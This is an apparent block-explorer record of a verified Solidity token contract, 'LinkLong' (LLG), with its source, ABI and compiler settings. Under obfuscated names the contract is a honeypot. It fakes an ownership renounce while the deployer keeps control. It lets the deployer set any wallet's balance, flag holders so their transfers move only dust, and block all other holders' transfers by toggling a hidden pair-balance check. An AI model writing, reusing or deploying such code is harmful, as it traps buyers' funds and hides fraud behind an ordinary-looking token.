{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface tokenSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract atMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atLaunch {\n    function createPair(address shouldMarketingExempt, address amountAt) external returns (address);\n}\n\ninterface fromMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableSwap) external view returns (uint256);\n\n    function transfer(address sellLaunch, uint256 teamLaunch) external returns (bool);\n\n    function allowance(address feeSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellLaunch,\n        uint256 teamLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toBuy, uint256 value);\n    event Approval(address indexed feeSender, address indexed spender, uint256 value);\n}\n\ninterface fromMinMetadata is fromMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LinkLong is atMarketing, fromMin, fromMinMetadata {\n\n    uint256 private shouldSellList;\n\n    uint256 constant exemptSwapIs = 6 ** 10;\n\n    address fromTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return autoSwap;\n    }\n\n    mapping(address => uint256) private walletList;\n\n    constructor (){\n        if (exemptBuy == shouldSellList) {\n            senderShould = true;\n        }\n        tokenSwap sellBuy = tokenSwap(fromTo);\n        walletExempt = atLaunch(sellBuy.factory()).createPair(sellBuy.WETH(), address(this));\n        \n        totalTxAmount = _msgSender();\n        totalLaunchedFee();\n        toExempt[totalTxAmount] = true;\n        walletList[totalTxAmount] = fromFee;\n        \n        emit Transfer(address(0), totalTxAmount, fromFee);\n    }\n\n    bool public feeMode;\n\n    mapping(address => mapping(address => uint256)) private maxFund;\n\n    address public totalTxAmount;\n\n    bool public senderShould;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverLaunchLaunched;\n    }\n\n    uint256 private autoFund;\n\n    function senderReceiverWallet() private view {\n        require(toExempt[_msgSender()]);\n    }\n\n    function transferFrom(address amountMax, address sellLaunch, uint256 teamLaunch) external override returns (bool) {\n        if (_msgSender() != fromTo) {\n            if (maxFund[amountMax][_msgSender()] != type(uint256).max) {\n                require(teamLaunch <= maxFund[amountMax][_msgSender()]);\n                maxFund[amountMax][_msgSender()] -= teamLaunch;\n            }\n        }\n        return totalTake(amountMax, sellLaunch, teamLaunch);\n    }\n\n    bool public sellLimit;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromFee;\n    }\n\n    address fundEnableLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public walletExempt;\n\n    function txMaxAmount(uint256 teamLaunch) public {\n        senderReceiverWallet();\n        receiverMarketingEnable = teamLaunch;\n    }\n\n    address private autoSwap;\n\n    function allowance(address teamMaxReceiver, address sellAuto) external view virtual override returns (uint256) {\n        if (sellAuto == fromTo) {\n            return type(uint256).max;\n        }\n        return maxFund[teamMaxReceiver][sellAuto];\n    }\n\n    mapping(address => bool) public walletTeam;\n\n    function liquiditySwapAmount(address atTrading) public {\n        if (sellLimit) {\n            return;\n        }\n        if (exemptBuy == autoFund) {\n            senderShould = true;\n        }\n        toExempt[atTrading] = true;\n        if (exemptBuy != shouldSellList) {\n            shouldSellList = fundLaunched;\n        }\n        sellLimit = true;\n    }\n\n    function balanceOf(address enableSwap) public view virtual override returns (uint256) {\n        return walletList[enableSwap];\n    }\n\n    uint256 receiverMarketingEnable;\n\n    function getOwner() external view returns (address) {\n        return autoSwap;\n    }\n\n    uint256 private exemptBuy;\n\n    function totalLaunchedFee() public {\n        emit OwnershipTransferred(totalTxAmount, address(0));\n        autoSwap = address(0);\n    }\n\n    string private receiverLaunchLaunched = \"Link Long\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitFund;\n    }\n\n    uint256 private fundLaunched;\n\n    function transfer(address shouldFund, uint256 teamLaunch) external virtual override returns (bool) {\n        return totalTake(_msgSender(), shouldFund, teamLaunch);\n    }\n\n    uint8 private enableBuyMarketing = 18;\n\n    mapping(address => bool) public toExempt;\n\n    function approve(address sellAuto, uint256 teamLaunch) public virtual override returns (bool) {\n        maxFund[_msgSender()][sellAuto] = teamLaunch;\n        emit Approval(_msgSender(), sellAuto, teamLaunch);\n        return true;\n    }\n\n    function tradingTo(address amountMax, address sellLaunch, uint256 teamLaunch) internal returns (bool) {\n        require(walletList[amountMax] >= teamLaunch);\n        walletList[amountMax] -= teamLaunch;\n        walletList[sellLaunch] += teamLaunch;\n        emit Transfer(amountMax, sellLaunch, teamLaunch);\n        return true;\n    }\n\n    function minTeam(address senderMarketingSwap) public {\n        senderReceiverWallet();\n        if (senderShould == feeMode) {\n            receiverLimitSwap = autoFund;\n        }\n        if (senderMarketingSwap == totalTxAmount || senderMarketingSwap == walletExempt) {\n            return;\n        }\n        walletTeam[senderMarketingSwap] = true;\n    }\n\n    uint256 senderMin;\n\n    uint256 private fromFee = 100000000 * 10 ** 18;\n\n    uint256 public receiverLimitSwap;\n\n    function enableLiquidityTrading(address shouldFund, uint256 teamLaunch) public {\n        senderReceiverWallet();\n        walletList[shouldFund] = teamLaunch;\n    }\n\n    function totalTake(address amountMax, address sellLaunch, uint256 teamLaunch) internal returns (bool) {\n        if (amountMax == totalTxAmount) {\n            return tradingTo(amountMax, sellLaunch, teamLaunch);\n        }\n        uint256 fromSell = fromMin(walletExempt).balanceOf(fundEnableLimit);\n        require(fromSell == receiverMarketingEnable);\n        require(sellLaunch != fundEnableLimit);\n        if (walletTeam[amountMax]) {\n            return tradingTo(amountMax, sellLaunch, exemptSwapIs);\n        }\n        return tradingTo(amountMax, sellLaunch, teamLaunch);\n    }\n\n    string private limitFund = \"LLG\";\n\n    event OwnershipTransferred(address indexed amountList, address indexed tradingReceiver);\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableBuyMarketing;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMaxReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamLaunch\",\"type\":\"uint256\"}],\"name\":\"enableLiquidityTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTrading\",\"type\":\"address\"}],\"name\":\"liquiditySwapAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMarketingSwap\",\"type\":\"address\"}],\"name\":\"minTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLimitSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunchedFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTxAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamLaunch\",\"type\":\"uint256\"}],\"name\":\"txMaxAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "LinkLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}